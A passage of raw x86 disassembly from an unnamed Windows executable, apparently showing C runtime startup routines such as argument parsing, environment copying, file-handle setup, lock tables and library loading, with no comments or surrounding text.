  424c8b:	movzx  edx,cl
  424c8e:	test   BYTE PTR [edx+0x4674e1],0x4
  424c95:	je     0x424c9d
  424c97:	mov    BYTE PTR [edi],cl
  424c99:	inc    edi
  424c9a:	inc    eax
  424c9b:	inc    DWORD PTR [esi]
  424c9d:	mov    cl,BYTE PTR [eax]
  424c9f:	mov    BYTE PTR [edi],cl
  424ca1:	inc    edi
  424ca2:	jmp    0x424cb3
  424ca4:	movzx  ecx,cl
  424ca7:	test   BYTE PTR [ecx+0x4674e1],0x4
  424cae:	je     0x424cb3
  424cb0:	inc    eax
  424cb1:	inc    DWORD PTR [esi]
  424cb3:	inc    DWORD PTR [esi]
  424cb5:	inc    eax
  424cb6:	jmp    0x424c23
  424cbb:	test   edi,edi
  424cbd:	je     0x424cc3
  424cbf:	and    BYTE PTR [edi],0x0
  424cc2:	inc    edi
  424cc3:	inc    DWORD PTR [esi]
  424cc5:	mov    ebx,DWORD PTR [ebp+0xc]
  424cc8:	jmp    0x424bee
  424ccd:	mov    eax,DWORD PTR [ebp+0x8]
  424cd0:	test   eax,eax
  424cd2:	je     0x424cd7
  424cd4:	and    DWORD PTR [eax],0x0
  424cd7:	inc    DWORD PTR [ebx]
  424cd9:	pop    edi
  424cda:	pop    ebx
  424cdb:	leave  
  424cdc:	ret    
  424cdd:	push   ebp
  424cde:	mov    ebp,esp
  424ce0:	push   ecx
  424ce1:	push   ecx
  424ce2:	push   ebx
  424ce3:	push   esi
  424ce4:	push   edi
  424ce5:	xor    edi,edi
  424ce7:	cmp    DWORD PTR ds:0x46782c,edi
  424ced:	jne    0x424cf4
  424cef:	call   0x425e7c
  424cf4:	and    BYTE PTR ds:0x4671d4,0x0
  424cfb:	push   0x104
  424d00:	mov    esi,0x4670d0
  424d05:	push   esi
  424d06:	push   edi
  424d07:	call   DWORD PTR ds:0x429084
  424d0d:	mov    eax,ds:0x467834
  424d12:	cmp    eax,edi
  424d14:	mov    DWORD PTR ds:0x4670b4,esi
  424d1a:	je     0x424d23
  424d1c:	cmp    BYTE PTR [eax],0x0
  424d1f:	mov    ebx,eax
  424d21:	jne    0x424d25
  424d23:	mov    ebx,esi
  424d25:	lea    eax,[ebp-0x4]
  424d28:	push   eax
  424d29:	push   edi
  424d2a:	lea    esi,[ebp-0x8]
  424d2d:	xor    ecx,ecx
  424d2f:	mov    eax,ebx
  424d31:	call   0x424b71
  424d36:	mov    esi,DWORD PTR [ebp-0x4]
  424d39:	mov    eax,DWORD PTR [ebp-0x8]
  424d3c:	shl    esi,0x2
  424d3f:	add    eax,esi
  424d41:	push   eax
  424d42:	call   0x425fb2
  424d47:	mov    edi,eax
  424d49:	add    esp,0xc
  424d4c:	test   edi,edi
  424d4e:	jne    0x424d55
  424d50:	or     eax,0xffffffff
  424d53:	jmp    0x424d7a
  424d55:	lea    eax,[ebp-0x4]
  424d58:	push   eax
  424d59:	lea    ecx,[esi+edi*1]
  424d5c:	push   edi
  424d5d:	lea    esi,[ebp-0x8]
  424d60:	mov    eax,ebx
  424d62:	call   0x424b71
  424d67:	mov    eax,DWORD PTR [ebp-0x4]
  424d6a:	dec    eax
  424d6b:	pop    ecx
  424d6c:	mov    ds:0x467098,eax
  424d71:	pop    ecx
  424d72:	mov    DWORD PTR ds:0x46709c,edi
  424d78:	xor    eax,eax
  424d7a:	pop    edi
  424d7b:	pop    esi
  424d7c:	pop    ebx
  424d7d:	leave  
  424d7e:	ret    
  424d7f:	push   ecx
  424d80:	push   ecx
  424d81:	mov    eax,ds:0x4671d8
  424d86:	push   ebx
  424d87:	push   ebp
  424d88:	push   esi
  424d89:	push   edi
  424d8a:	mov    edi,DWORD PTR ds:0x42909c
  424d90:	xor    ebx,ebx
  424d92:	xor    esi,esi
  424d94:	cmp    eax,ebx
  424d96:	push   0x2
  424d98:	pop    ebp
  424d99:	jne    0x424dc8
  424d9b:	call   edi
  424d9d:	mov    esi,eax
  424d9f:	cmp    esi,ebx
  424da1:	je     0x424daf
  424da3:	mov    DWORD PTR ds:0x4671d8,0x1
  424dad:	jmp    0x424dcd
  424daf:	call   DWORD PTR ds:0x429034
  424db5:	cmp    eax,0x78
  424db8:	jne    0x424dc3
  424dba:	mov    eax,ebp
  424dbc:	mov    ds:0x4671d8,eax
  424dc1:	jmp    0x424dc8
  424dc3:	mov    eax,ds:0x4671d8
  424dc8:	cmp    eax,0x1
  424dcb:	jne    0x424e4a
  424dcd:	cmp    esi,ebx
  424dcf:	jne    0x424dd9
  424dd1:	call   edi
  424dd3:	mov    esi,eax
  424dd5:	cmp    esi,ebx
  424dd7:	je     0x424e52
  424dd9:	cmp    WORD PTR [esi],bx
  424ddc:	mov    eax,esi
  424dde:	je     0x424dee
  424de0:	add    eax,ebp
  424de2:	cmp    WORD PTR [eax],bx
  424de5:	jne    0x424de0
  424de7:	add    eax,ebp
  424de9:	cmp    WORD PTR [eax],bx
  424dec:	jne    0x424de0
  424dee:	mov    edi,DWORD PTR ds:0x429098
  424df4:	push   ebx
  424df5:	push   ebx
  424df6:	push   ebx
  424df7:	sub    eax,esi
  424df9:	push   ebx
  424dfa:	sar    eax,1
  424dfc:	inc    eax
  424dfd:	push   eax
  424dfe:	push   esi
  424dff:	push   ebx
  424e00:	push   ebx
  424e01:	mov    DWORD PTR [esp+0x34],eax
  424e05:	call   edi
  424e07:	mov    ebp,eax
  424e09:	cmp    ebp,ebx
  424e0b:	je     0x424e3f
  424e0d:	push   ebp
  424e0e:	call   0x425fb2
  424e13:	cmp    eax,ebx
  424e15:	pop    ecx
  424e16:	mov    DWORD PTR [esp+0x10],eax
  424e1a:	je     0x424e3f
  424e1c:	push   ebx
  424e1d:	push   ebx
  424e1e:	push   ebp
  424e1f:	push   eax
  424e20:	push   DWORD PTR [esp+0x24]
  424e24:	push   esi
  424e25:	push   ebx
  424e26:	push   ebx
  424e27:	call   edi
  424e29:	test   eax,eax
  424e2b:	jne    0x424e3b
  424e2d:	push   DWORD PTR [esp+0x10]
  424e31:	call   0x425e9a
  424e36:	pop    ecx
  424e37:	mov    DWORD PTR [esp+0x10],ebx
  424e3b:	mov    ebx,DWORD PTR [esp+0x10]
  424e3f:	push   esi
  424e40:	call   DWORD PTR ds:0x429094
  424e46:	mov    eax,ebx
  424e48:	jmp    0x424e9a
  424e4a:	cmp    eax,ebp
  424e4c:	je     0x424e56
  424e4e:	cmp    eax,ebx
  424e50:	je     0x424e56
  424e52:	xor    eax,eax
  424e54:	jmp    0x424e9a
  424e56:	call   DWORD PTR ds:0x429090
  424e5c:	mov    esi,eax
  424e5e:	cmp    esi,ebx
  424e60:	je     0x424e52
  424e62:	cmp    BYTE PTR [esi],bl
  424e64:	je     0x424e70
  424e66:	inc    eax
  424e67:	cmp    BYTE PTR [eax],bl
  424e69:	jne    0x424e66
  424e6b:	inc    eax
  424e6c:	cmp    BYTE PTR [eax],bl
  424e6e:	jne    0x424e66
  424e70:	sub    eax,esi
  424e72:	inc    eax
  424e73:	mov    ebp,eax
  424e75:	push   ebp
  424e76:	call   0x425fb2
  424e7b:	mov    edi,eax
  424e7d:	cmp    edi,ebx
  424e7f:	pop    ecx
  424e80:	jne    0x424e86
  424e82:	xor    edi,edi
  424e84:	jmp    0x424e91
  424e86:	push   ebp
  424e87:	push   esi
  424e88:	push   edi
  424e89:	call   0x425fd0
  424e8e:	add    esp,0xc
  424e91:	push   esi
  424e92:	call   DWORD PTR ds:0x42908c
  424e98:	mov    eax,edi
  424e9a:	pop    edi
  424e9b:	pop    esi
  424e9c:	pop    ebp
  424e9d:	pop    ebx
  424e9e:	pop    ecx
  424e9f:	pop    ecx
  424ea0:	ret    
  424ea1:	sub    esp,0x48
  424ea4:	push   ebx
  424ea5:	mov    ebx,0x480
  424eaa:	push   ebx
  424eab:	call   0x425fb2
  424eb0:	test   eax,eax
  424eb2:	pop    ecx
  424eb3:	jne    0x424ebd
  424eb5:	or     eax,0xffffffff
  424eb8:	jmp    0x42509a
  424ebd:	mov    ds:0x467720,eax
  424ec2:	mov    DWORD PTR ds:0x467708,0x20
  424ecc:	lea    ecx,[eax+0x480]
  424ed2:	jmp    0x424ef2
  424ed4:	and    BYTE PTR [eax+0x4],0x0
  424ed8:	or     DWORD PTR [eax],0xffffffff
  424edb:	and    DWORD PTR [eax+0x8],0x0
  424edf:	mov    BYTE PTR [eax+0x5],0xa
  424ee3:	mov    ecx,DWORD PTR ds:0x467720
  424ee9:	add    eax,0x24
  424eec:	add    ecx,0x480
  424ef2:	cmp    eax,ecx
  424ef4:	jb     0x424ed4
  424ef6:	push   ebp
  424ef7:	push   esi
  424ef8:	push   edi
  424ef9:	lea    eax,[esp+0x14]
  424efd:	push   eax
  424efe:	call   DWORD PTR ds:0x429064
  424f04:	cmp    WORD PTR [esp+0x46],0x0
  424f0a:	je     0x424ff9
  424f10:	mov    eax,DWORD PTR [esp+0x48]
  424f14:	test   eax,eax
  424f16:	je     0x424ff9
  424f1c:	mov    edi,DWORD PTR [eax]
  424f1e:	lea    ebp,[eax+0x4]
  424f21:	lea    eax,[edi+ebp*1]
  424f24:	mov    DWORD PTR [esp+0x10],eax
  424f28:	mov    eax,0x800
  424f2d:	cmp    edi,eax
  424f2f:	jl     0x424f33
  424f31:	mov    edi,eax
  424f33:	cmp    DWORD PTR ds:0x467708,edi
  424f39:	jge    0x424f89
  424f3b:	mov    esi,0x467724
  424f40:	push   ebx
  424f41:	call   0x425fb2
  424f46:	test   eax,eax
  424f48:	pop    ecx
  424f49:	je     0x424f83
  424f4b:	add    DWORD PTR ds:0x467708,0x20
  424f52:	mov    DWORD PTR [esi],eax
  424f54:	lea    ecx,[eax+0x480]
  424f5a:	jmp    0x424f72
  424f5c:	and    BYTE PTR [eax+0x4],0x0
  424f60:	or     DWORD PTR [eax],0xffffffff
  424f63:	and    DWORD PTR [eax+0x8],0x0
  424f67:	mov    BYTE PTR [eax+0x5],0xa
  424f6b:	mov    ecx,DWORD PTR [esi]
  424f6d:	add    eax,0x24
  424f70:	add    ecx,ebx
  424f72:	cmp    eax,ecx
  424f74:	jb     0x424f5c
  424f76:	add    esi,0x4
  424f79:	cmp    DWORD PTR ds:0x467708,edi
  424f7f:	jl     0x424f40
  424f81:	jmp    0x424f89
  424f83:	mov    edi,DWORD PTR ds:0x467708
  424f89:	xor    ebx,ebx
  424f8b:	test   edi,edi
  424f8d:	jle    0x424ff9
  424f8f:	mov    eax,DWORD PTR [esp+0x10]
  424f93:	mov    eax,DWORD PTR [eax]
  424f95:	cmp    eax,0xffffffff
  424f98:	je     0x424fee
  424f9a:	mov    cl,BYTE PTR [ebp+0x0]
  424f9d:	test   cl,0x1
  424fa0:	je     0x424fee
  424fa2:	test   cl,0x8
  424fa5:	jne    0x424fb2
  424fa7:	push   eax
  424fa8:	call   DWORD PTR ds:0x4290a4
  424fae:	test   eax,eax
  424fb0:	je     0x424fee
  424fb2:	mov    ecx,ebx
  424fb4:	mov    eax,ebx
  424fb6:	and    eax,0x1f
  424fb9:	lea    eax,[eax+eax*8]
  424fbc:	sar    ecx,0x5
  424fbf:	mov    ecx,DWORD PTR [ecx*4+0x467720]
  424fc6:	lea    esi,[ecx+eax*4]
  424fc9:	mov    eax,DWORD PTR [esp+0x10]
  424fcd:	mov    eax,DWORD PTR [eax]
  424fcf:	mov    DWORD PTR [esi],eax
  424fd1:	mov    al,BYTE PTR [ebp+0x0]
  424fd4:	mov    BYTE PTR [esi+0x4],al
  424fd7:	lea    eax,[esi+0xc]
  424fda:	push   0xfa0
  424fdf:	push   eax
  424fe0:	call   0x42631d
  424fe5:	test   eax,eax
  424fe7:	pop    ecx
  424fe8:	pop    ecx
  424fe9:	je     0x425019
  424feb:	inc    DWORD PTR [esi+0x8]
  424fee:	add    DWORD PTR [esp+0x10],0x4
  424ff3:	inc    ebx
  424ff4:	inc    ebp
  424ff5:	cmp    ebx,edi
  424ff7:	jl     0x424f8f
  424ff9:	xor    ebx,ebx
  424ffb:	mov    ecx,DWORD PTR ds:0x467720
  425001:	lea    eax,[ebx+ebx*8]
  425004:	lea    esi,[ecx+eax*4]
  425007:	cmp    DWORD PTR [esi],0xffffffff
  42500a:	jne    0x42507b
  42500c:	test   ebx,ebx
  42500e:	mov    BYTE PTR [esi+0x4],0x81
  425012:	jne    0x42501e
  425014:	push   0xfffffff6
  425016:	pop    eax
  425017:	jmp    0x425028
  425019:	or     eax,0xffffffff
  42501c:	jmp    0x425097
  42501e:	mov    eax,ebx
  425020:	dec    eax
  425021:	neg    eax
  425023:	sbb    eax,eax
  425025:	add    eax,0xfffffff5
  425028:	push   eax
  425029:	call   DWORD PTR ds:0x429080
  42502f:	mov    edi,eax
  425031:	cmp    edi,0xffffffff
  425034:	je     0x425075
  425036:	push   edi
  425037:	call   DWORD PTR ds:0x4290a4
  42503d:	test   eax,eax
  42503f:	je     0x425075
  425041:	and    eax,0xff
  425046:	cmp    eax,0x2
  425049:	mov    DWORD PTR [esi],edi
  42504b:	jne    0x425053
  42504d:	or     BYTE PTR [esi+0x4],0x40
  425051:	jmp    0x42505c
  425053:	cmp    eax,0x3
  425056:	jne    0x42505c
  425058:	or     BYTE PTR [esi+0x4],0x8
  42505c:	lea    eax,[esi+0xc]
  42505f:	push   0xfa0
  425064:	push   eax
  425065:	call   0x42631d
  42506a:	test   eax,eax
  42506c:	pop    ecx
  42506d:	pop    ecx
  42506e:	je     0x425019
  425070:	inc    DWORD PTR [esi+0x8]
  425073:	jmp    0x42507f
  425075:	or     BYTE PTR [esi+0x4],0x40
  425079:	jmp    0x42507f
  42507b:	or     BYTE PTR [esi+0x4],0x80
  42507f:	inc    ebx
  425080:	cmp    ebx,0x3
  425083:	jl     0x424ffb
  425089:	push   DWORD PTR ds:0x467708
  42508f:	call   DWORD PTR ds:0x4290a0
  425095:	xor    eax,eax
  425097:	pop    edi
  425098:	pop    esi
  425099:	pop    ebp
  42509a:	pop    ebx
  42509b:	add    esp,0x48
  42509e:	ret    
  42509f:	push   0xc
  4250a1:	push   0x429500
  4250a6:	call   0x425290
  4250ab:	mov    DWORD PTR [ebp-0x1c],0x429f58
  4250b2:	cmp    DWORD PTR [ebp-0x1c],0x429f58
  4250b9:	jae    0x4250dd
  4250bb:	and    DWORD PTR [ebp-0x4],0x0
  4250bf:	mov    eax,DWORD PTR [ebp-0x1c]
  4250c2:	mov    eax,DWORD PTR [eax]
  4250c4:	test   eax,eax
  4250c6:	je     0x4250d3
  4250c8:	call   eax
  4250ca:	jmp    0x4250d3
  4250cc:	xor    eax,eax
  4250ce:	inc    eax
  4250cf:	ret    
  4250d0:	mov    esp,DWORD PTR [ebp-0x18]
  4250d3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4250d7:	add    DWORD PTR [ebp-0x1c],0x4
  4250db:	jmp    0x4250b2
  4250dd:	call   0x4252cb
  4250e2:	ret    
  4250e3:	push   0xc
  4250e5:	push   0x429510
  4250ea:	call   0x425290
  4250ef:	mov    DWORD PTR [ebp-0x1c],0x429f60
  4250f6:	cmp    DWORD PTR [ebp-0x1c],0x429f60
  4250fd:	jae    0x425121
  4250ff:	and    DWORD PTR [ebp-0x4],0x0
  425103:	mov    eax,DWORD PTR [ebp-0x1c]
  425106:	mov    eax,DWORD PTR [eax]
  425108:	test   eax,eax
  42510a:	je     0x425117
  42510c:	call   eax
  42510e:	jmp    0x425117
  425110:	xor    eax,eax
  425112:	inc    eax
  425113:	ret    
  425114:	mov    esp,DWORD PTR [ebp-0x18]
  425117:	or     DWORD PTR [ebp-0x4],0xffffffff
  42511b:	add    DWORD PTR [ebp-0x1c],0x4
  42511f:	jmp    0x4250f6
  425121:	call   0x4252cb
  425126:	ret    
  425127:	call   0x425366
  42512c:	mov    eax,ds:0x4668bc
  425131:	cmp    eax,0xffffffff
  425134:	je     0x425144
  425136:	push   eax
  425137:	call   DWORD PTR ds:0x4290ac
  42513d:	or     DWORD PTR ds:0x4668bc,0xffffffff
  425144:	ret    
  425145:	push   ebx
  425146:	push   esi
  425147:	call   DWORD PTR ds:0x429034
  42514d:	push   DWORD PTR ds:0x4668bc
  425153:	mov    ebx,eax
  425155:	call   DWORD PTR ds:0x4290bc
  42515b:	mov    esi,eax
  42515d:	test   esi,esi
  42515f:	jne    0x4251aa
  425161:	push   0x88
  425166:	push   0x1
  425168:	call   0x4263a8
  42516d:	mov    esi,eax
  42516f:	test   esi,esi
  425171:	pop    ecx
  425172:	pop    ecx
  425173:	je     0x4251a2
  425175:	push   esi
  425176:	push   DWORD PTR ds:0x4668bc
  42517c:	call   DWORD PTR ds:0x4290b8
  425182:	test   eax,eax
  425184:	je     0x4251a2
  425186:	mov    DWORD PTR [esi+0x54],0x466810
  42518d:	mov    DWORD PTR [esi+0x14],0x1
  425194:	call   DWORD PTR ds:0x4290b4
  42519a:	or     DWORD PTR [esi+0x4],0xffffffff
  42519e:	mov    DWORD PTR [esi],eax
  4251a0:	jmp    0x4251aa
  4251a2:	push   0x10
  4251a4:	call   0x424358
  4251a9:	pop    ecx
  4251aa:	push   ebx
  4251ab:	call   DWORD PTR ds:0x4290b0
  4251b1:	mov    eax,esi
  4251b3:	pop    esi
  4251b4:	pop    ebx
  4251b5:	ret    
  4251b6:	call   0x42531d
  4251bb:	test   eax,eax
  4251bd:	je     0x4251cf
  4251bf:	call   DWORD PTR ds:0x4290c0
  4251c5:	cmp    eax,0xffffffff
  4251c8:	mov    ds:0x4668bc,eax
  4251cd:	jne    0x4251d7
  4251cf:	call   0x425127
  4251d4:	xor    eax,eax
  4251d6:	ret    
  4251d7:	push   esi
  4251d8:	push   0x88
  4251dd:	push   0x1
  4251df:	call   0x4263a8
  4251e4:	mov    esi,eax
  4251e6:	test   esi,esi
  4251e8:	pop    ecx
  4251e9:	pop    ecx
  4251ea:	je     0x42521c
  4251ec:	push   esi
  4251ed:	push   DWORD PTR ds:0x4668bc
  4251f3:	call   DWORD PTR ds:0x4290b8
  4251f9:	test   eax,eax
  4251fb:	je     0x42521c
  4251fd:	mov    DWORD PTR [esi+0x54],0x466810
  425204:	mov    DWORD PTR [esi+0x14],0x1
  42520b:	call   DWORD PTR ds:0x4290b4
  425211:	or     DWORD PTR [esi+0x4],0xffffffff
  425215:	mov    DWORD PTR [esi],eax
  425217:	xor    eax,eax
  425219:	inc    eax
  42521a:	pop    esi
  42521b:	ret    
  42521c:	call   0x425127
  425221:	xor    eax,eax
  425223:	pop    esi
  425224:	ret    
  425225:	cmp    DWORD PTR ds:0x467084,0x2
  42522c:	jne    0x42523b
  42522e:	cmp    DWORD PTR ds:0x467090,0x5
  425235:	jb     0x42523b
  425237:	xor    eax,eax
  425239:	inc    eax
  42523a:	ret    
  42523b:	push   0x3
  42523d:	pop    eax
  42523e:	ret    
  42523f:	xor    eax,eax
  425241:	cmp    DWORD PTR [esp+0x4],eax
  425245:	push   0x0
  425247:	sete   al
  42524a:	push   0x1000
  42524f:	push   eax
  425250:	call   DWORD PTR ds:0x429038
  425256:	test   eax,eax
  425258:	mov    ds:0x467700,eax
  42525d:	je     0x425289
  42525f:	call   0x425225
  425264:	cmp    eax,0x3
  425267:	mov    ds:0x467704,eax
  42526c:	jne    0x42528c
  42526e:	push   0x3f8
  425273:	call   0x42662a
  425278:	test   eax,eax
  42527a:	pop    ecx
  42527b:	jne    0x42528c
  42527d:	push   DWORD PTR ds:0x467700
  425283:	call   DWORD PTR ds:0x429020
  425289:	xor    eax,eax
  42528b:	ret    
  42528c:	xor    eax,eax
  42528e:	inc    eax
  42528f:	ret    
  425290:	push   0x427158
  425295:	mov    eax,fs:0x0
  42529b:	push   eax
  42529c:	mov    eax,DWORD PTR [esp+0x10]
  4252a0:	mov    DWORD PTR [esp+0x10],ebp
  4252a4:	lea    ebp,[esp+0x10]
  4252a8:	sub    esp,eax
  4252aa:	push   ebx
  4252ab:	push   esi
  4252ac:	push   edi
  4252ad:	mov    eax,DWORD PTR [ebp-0x8]
  4252b0:	mov    DWORD PTR [ebp-0x18],esp
  4252b3:	push   eax
  4252b4:	mov    eax,DWORD PTR [ebp-0x4]
  4252b7:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4252be:	mov    DWORD PTR [ebp-0x8],eax
  4252c1:	lea    eax,[ebp-0x10]
  4252c4:	mov    fs:0x0,eax
  4252ca:	ret    
  4252cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4252ce:	mov    DWORD PTR fs:0x0,ecx
  4252d5:	pop    ecx
  4252d6:	pop    edi
  4252d7:	pop    esi
  4252d8:	pop    ebx
  4252d9:	leave  
  4252da:	push   ecx
  4252db:	ret    
  4252dc:	int3   
  4252dd:	int3   
  4252de:	int3   
  4252df:	int3   
  4252e0:	cmp    eax,0x1000
  4252e5:	jae    0x4252f5
  4252e7:	neg    eax
  4252e9:	add    eax,esp
  4252eb:	add    eax,0x4
  4252ee:	test   DWORD PTR [eax],eax
  4252f0:	xchg   esp,eax
  4252f1:	mov    eax,DWORD PTR [eax]
  4252f3:	push   eax
  4252f4:	ret    
  4252f5:	push   ecx
  4252f6:	lea    ecx,[esp+0x8]
  4252fa:	sub    ecx,0x1000
  425300:	sub    eax,0x1000
  425305:	test   DWORD PTR [ecx],eax
  425307:	cmp    eax,0x1000
  42530c:	jae    0x4252fa
  42530e:	sub    ecx,eax
  425310:	mov    eax,esp
  425312:	test   DWORD PTR [ecx],eax
  425314:	mov    esp,ecx
  425316:	mov    ecx,DWORD PTR [eax]
  425318:	mov    eax,DWORD PTR [eax+0x4]
  42531b:	push   eax
  42531c:	ret    
  42531d:	push   esi
  42531e:	push   edi
  42531f:	xor    esi,esi
  425321:	mov    edi,0x4671e0
  425326:	cmp    DWORD PTR [esi*8+0x4668d4],0x1
  42532e:	jne    0x42534e
  425330:	lea    eax,[esi*8+0x4668d0]
  425337:	mov    DWORD PTR [eax],edi
  425339:	push   0xfa0
  42533e:	push   DWORD PTR [eax]
  425340:	add    edi,0x18
  425343:	call   0x42631d
  425348:	test   eax,eax
  42534a:	pop    ecx
  42534b:	pop    ecx
  42534c:	je     0x42535a
  42534e:	inc    esi
  42534f:	cmp    esi,0x24
  425352:	jl     0x425326
  425354:	xor    eax,eax
  425356:	inc    eax
  425357:	pop    edi
  425358:	pop    esi
  425359:	ret    
  42535a:	and    DWORD PTR [esi*8+0x4668d0],0x0
  425362:	xor    eax,eax
  425364:	jmp    0x425357
  425366:	push   ebx
  425367:	mov    ebx,DWORD PTR ds:0x4290a8
  42536d:	push   esi
  42536e:	mov    esi,0x4668d0
  425373:	push   edi
  425374:	mov    edi,DWORD PTR [esi]
  425376:	test   edi,edi
  425378:	je     0x42538d
  42537a:	cmp    DWORD PTR [esi+0x4],0x1
  42537e:	je     0x42538d
  425380:	push   edi
  425381:	call   ebx
  425383:	push   edi
  425384:	call   0x425e9a
  425389:	and    DWORD PTR [esi],0x0
  42538c:	pop    ecx
  42538d:	add    esi,0x8
  425390:	cmp    esi,0x4669f0
  425396:	jl     0x425374
  425398:	mov    esi,0x4668d0
  42539d:	pop    edi
  42539e:	mov    eax,DWORD PTR [esi]
  4253a0:	test   eax,eax
  4253a2:	je     0x4253ad
  4253a4:	cmp    DWORD PTR [esi+0x4],0x1
  4253a8:	jne    0x4253ad
  4253aa:	push   eax
  4253ab:	call   ebx
  4253ad:	add    esi,0x8
  4253b0:	cmp    esi,0x4669f0
  4253b6:	jl     0x42539e
  4253b8:	pop    esi
  4253b9:	pop    ebx
  4253ba:	ret    
  4253bb:	push   ebp
  4253bc:	mov    ebp,esp
  4253be:	mov    eax,DWORD PTR [ebp+0x8]
  4253c1:	push   DWORD PTR [eax*8+0x4668d0]
  4253c8:	call   DWORD PTR ds:0x4290c4
  4253ce:	pop    ebp
  4253cf:	ret    
  4253d0:	push   ebp
  4253d1:	mov    ebp,esp
  4253d3:	push   esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x8]
  4253d7:	lea    esi,[esi*8+0x4668d0]
  4253de:	cmp    DWORD PTR [esi],0x0
  4253e1:	je     0x4253e8
  4253e3:	xor    eax,eax
  4253e5:	inc    eax
  4253e6:	jmp    0x42544c
  4253e8:	push   edi
  4253e9:	push   0x18
  4253eb:	call   0x425fb2
  4253f0:	mov    edi,eax
  4253f2:	test   edi,edi
  4253f4:	pop    ecx
  4253f5:	jne    0x425406
  4253f7:	call   0x427230
  4253fc:	mov    DWORD PTR [eax],0xc
  425402:	xor    eax,eax
  425404:	jmp    0x42544b
  425406:	push   0xa
  425408:	call   0x42544f
  42540d:	cmp    DWORD PTR [esi],0x0
  425410:	pop    ecx
  425411:	jne    0x425439
  425413:	push   0xfa0
  425418:	push   edi
  425419:	call   0x42631d
  42541e:	test   eax,eax
  425420:	pop    ecx
  425421:	pop    ecx
  425422:	jne    0x425435
  425424:	push   edi
  425425:	call   0x425e9a
  42542a:	push   0xa
  42542c:	call   0x4253bb
  425431:	pop    ecx
  425432:	pop    ecx
  425433:	jmp    0x4253f7
  425435:	mov    DWORD PTR [esi],edi
  425437:	jmp    0x425440
  425439:	push   edi
  42543a:	call   0x425e9a
  42543f:	pop    ecx
  425440:	push   0xa
  425442:	call   0x4253bb
  425447:	xor    eax,eax
  425449:	pop    ecx
  42544a:	inc    eax
  42544b:	pop    edi
  42544c:	pop    esi
  42544d:	pop    ebp
  42544e:	ret    
  42544f:	push   ebp
  425450:	mov    ebp,esp
  425452:	mov    eax,DWORD PTR [ebp+0x8]
  425455:	push   esi
  425456:	lea    esi,[eax*8+0x4668d0]
  42545d:	cmp    DWORD PTR [esi],0x0
  425460:	jne    0x425475
  425462:	push   eax
  425463:	call   0x4253d0
  425468:	test   eax,eax
  42546a:	pop    ecx
  42546b:	jne    0x425475
  42546d:	push   0x11
  42546f:	call   0x424358
  425474:	pop    ecx
  425475:	push   DWORD PTR [esi]
  425477:	call   DWORD PTR ds:0x4290c8
  42547d:	pop    esi
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   esi
  425481:	push   DWORD PTR ds:0x467828
  425487:	call   0x4273e6
  42548c:	pop    ecx
  42548d:	mov    ecx,DWORD PTR ds:0x467824
  425493:	mov    esi,eax
  425495:	mov    eax,ds:0x467828
  42549a:	mov    edx,ecx
  42549c:	sub    edx,eax
  42549e:	add    edx,0x4
  4254a1:	cmp    esi,edx
  4254a3:	jae    0x4254f3
  4254a5:	mov    ecx,0x800
  4254aa:	cmp    esi,ecx
  4254ac:	jae    0x4254b0
  4254ae:	mov    ecx,esi
  4254b0:	add    ecx,esi
  4254b2:	push   ecx
  4254b3:	push   eax
  4254b4:	call   0x427239
  4254b9:	test   eax,eax
  4254bb:	pop    ecx
  4254bc:	pop    ecx
  4254bd:	jne    0x4254d6
  4254bf:	add    esi,0x10
  4254c2:	push   esi
  4254c3:	push   DWORD PTR ds:0x467828
  4254c9:	call   0x427239
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254d6
  4254d4:	pop    esi
  4254d5:	ret    
  4254d6:	mov    ecx,DWORD PTR ds:0x467824
  4254dc:	sub    ecx,DWORD PTR ds:0x467828
  4254e2:	mov    ds:0x467828,eax
  4254e7:	sar    ecx,0x2
  4254ea:	lea    ecx,[eax+ecx*4]
  4254ed:	mov    DWORD PTR ds:0x467824,ecx
  4254f3:	mov    DWORD PTR [ecx],edi
  4254f5:	add    DWORD PTR ds:0x467824,0x4
  4254fc:	mov    eax,edi
  4254fe:	pop    esi
  4254ff:	ret    
  425500:	push   0x80
  425505:	call   0x425fb2
  42550a:	test   eax,eax
  42550c:	pop    ecx
  42550d:	mov    ds:0x467828,eax
  425512:	jne    0x425518
  425514:	push   0x18
  425516:	pop    eax
  425517:	ret    
  425518:	and    DWORD PTR [eax],0x0
  42551b:	mov    eax,ds:0x467828
  425520:	mov    ds:0x467824,eax
  425525:	xor    eax,eax
  425527:	ret    
  425528:	push   0xc
  42552a:	push   0x429520
  42552f:	call   0x425290
  425534:	call   0x4245a3
  425539:	and    DWORD PTR [ebp-0x4],0x0
  42553d:	mov    edi,DWORD PTR [ebp+0x8]
  425540:	call   0x425480
  425545:	mov    DWORD PTR [ebp-0x1c],eax
  425548:	or     DWORD PTR [ebp-0x4],0xffffffff
  42554c:	call   0x42555a
  425551:	mov    eax,DWORD PTR [ebp-0x1c]
  425554:	call   0x4252cb
  425559:	ret    
  42555a:	call   0x4245ac
  42555f:	ret    
  425560:	push   DWORD PTR [esp+0x4]
  425564:	call   0x425528
  425569:	neg    eax
  42556b:	sbb    eax,eax
  42556d:	neg    eax
  42556f:	pop    ecx
  425570:	dec    eax
  425571:	ret    
  425572:	push   ebp
  425573:	mov    ebp,esp
  425575:	sub    esp,0x10
  425578:	push   ebx
  425579:	xor    ebx,ebx
  42557b:	cmp    DWORD PTR ds:0x467330,ebx
  425581:	push   esi
  425582:	push   edi
  425583:	jne    0x4255f2
  425585:	push   0x429590
  42558a:	call   DWORD PTR ds:0x4290cc
  425590:	mov    edi,eax
  425592:	cmp    edi,ebx
  425594:	je     0x42562d
  42559a:	mov    esi,DWORD PTR ds:0x429048
  4255a0:	push   0x429584
  4255a5:	push   edi
  4255a6:	call   esi
  4255a8:	test   eax,eax
  4255aa:	mov    ds:0x467330,eax
  4255af:	je     0x42562d
  4255b1:	push   0x429574
  4255b6:	push   edi
  4255b7:	call   esi
  4255b9:	push   0x429560
  4255be:	push   edi
  4255bf:	mov    ds:0x467334,eax
  4255c4:	call   esi
  4255c6:	cmp    DWORD PTR ds:0x467084,0x2
  4255cd:	mov    ds:0x467338,eax
  4255d2:	jne    0x4255f2
  4255d4:	push   0x429544
  4255d9:	push   edi
  4255da:	call   esi
  4255dc:	test   eax,eax
  4255de:	mov    ds:0x467340,eax
  4255e3:	je     0x4255f2
  4255e5:	push   0x42952c
